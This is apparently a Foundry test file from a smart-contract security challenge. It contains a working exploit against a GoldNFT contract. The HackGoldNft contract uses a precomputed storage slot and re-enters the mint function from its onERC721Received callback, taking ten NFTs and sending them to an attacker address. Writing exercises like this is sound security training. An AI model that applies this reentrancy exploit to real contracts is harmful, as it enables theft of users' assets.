// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract Hack is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("goerli", 8591866);
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);

        nftHack = new HackGoldNft();
        nftHack.attack(nft, hacker);

        assertEq(nft.balanceOf(hacker), 10);
    }
}

contract HackGoldNft is IERC721Receiver {
    uint8 minted = 0;
    bytes32 public constant STORAGE_TRUE_LOCATION =
        0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe;
    GoldNFT nft;
    address private hacker;

    function attack(GoldNFT nft_, address hacker_) public {
        nft = nft_;
        hacker = hacker_;
        minted++;
        nft.takeONEnft(STORAGE_TRUE_LOCATION);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        nft.transferFrom(address(this), hacker, tokenId);
        if (minted == 10) {
            return IERC721Receiver.onERC721Received.selector;
        }
        minted++;
        nft.takeONEnft(STORAGE_TRUE_LOCATION);
        return IERC721Receiver.onERC721Received.selector;
    }
}
